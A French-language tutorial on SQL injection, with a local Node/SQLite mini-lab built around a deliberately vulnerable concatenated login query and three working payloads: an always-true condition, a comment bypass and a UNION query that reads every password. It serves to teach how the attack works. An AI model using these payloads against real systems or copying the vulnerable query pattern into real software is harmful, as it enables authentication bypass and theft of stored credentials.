# Comprendre et reproduire une injection SQL

L'injection SQL existe depuis la fin des années 1990 et figure toujours dans
l'OWASP Top 10 (catégorie *Injection*). Sa cause tient en une phrase : **une
donnée fournie par l'utilisateur est collée dans le texte d'une requête**, et la
base de données ne peut plus distinguer la donnée du code.

## Le mécanisme

Une application vérifie un mot de passe avec cette requête, construite par
concaténation :

```sql
SELECT email, role FROM users WHERE email = 'ENTRÉE' AND password = 'ENTRÉE'
```

Si l'attaquant tape `x' OR '1'='1` comme mot de passe, la requête devient :

```sql
SELECT email, role FROM users WHERE email = 'admin@lab.test' AND password = 'x' OR '1'='1'
```

L'apostrophe a **fermé la chaîne**, et `OR '1'='1'` ajoute une condition toujours
vraie. La requête renvoie tous les utilisateurs.

## Mini-lab : à toi de jouer

Ce lab tourne entièrement dans ton propre processus Node, sur une base en
mémoire : il ne touche aucun serveur. Crée un fichier `sqli-lab.mjs` :

```js
import { DatabaseSync } from 'node:sqlite';

const db = new DatabaseSync(':memory:');
db.exec(`
  CREATE TABLE users (email TEXT, password TEXT, role TEXT);
  INSERT INTO users VALUES ('alice@lab.test', 'correct horse', 'user');
  INSERT INTO users VALUES ('admin@lab.test', 'S3cr3t-adm1n', 'admin');
`);

const [email = '', password = ''] = process.argv.slice(2);

// VULNÉRABLE : les entrées sont collées dans le texte de la requête.
const sql = `SELECT email, role FROM users WHERE email = '${email}' AND password = '${password}'`;
console.log('Requête exécutée :', sql);
console.log('Résultat :', db.prepare(sql).all());
```

> Ce lab stocke les mots de passe en clair, exprès, pour que l'attaque soit
> visible. Dans Bastion, ils sont hachés avec scrypt.

Lance-le d'abord normalement :

```bash
node sqli-lab.mjs alice@lab.test "correct horse"
```

Puis essaie ces trois attaques et observe la requête affichée :

```bash
# 1. Condition toujours vraie : tous les comptes sortent
node sqli-lab.mjs admin@lab.test "x' OR '1'='1"

# 2. Commentaire : le contrôle du mot de passe disparaît
node sqli-lab.mjs "admin@lab.test'--" "nimporte"

# 3. UNION : on lit une autre colonne (les mots de passe !)
node sqli-lab.mjs "x' UNION SELECT password, email FROM users--" "x"
```

La troisième attaque est la plus grave : `UNION` ajoute le résultat d'une
**seconde requête choisie par l'attaquant**. Ici, tu lis les mots de passe de
tout le monde dans la colonne `email`.

## Les grandes familles

| Famille | Principe | Exemple |
|---|---|---|
| **In-band** | Le résultat apparaît directement dans la réponse | `UNION SELECT` |
| **Basée sur les erreurs** | Le message d'erreur SQL laisse fuiter des informations | Une erreur affiche le nom d'une table |
| **Aveugle** | Rien ne s'affiche : l'attaquant déduit une réponse vrai/faux, ou mesure un délai | `AND substr(password,1,1)='S'` |

Une injection aveugle est plus lente à exploiter, mais elle mène au même
résultat : des outils automatisés comme sqlmap extraient une base caractère par
caractère.

## À retenir

- L'injection SQL naît quand une donnée est collée dans le texte d'une requête.
- Une apostrophe suffit pour sortir de la chaîne et écrire du SQL.
- Lecture, modification, contournement d'authentification : l'impact est
  souvent total.
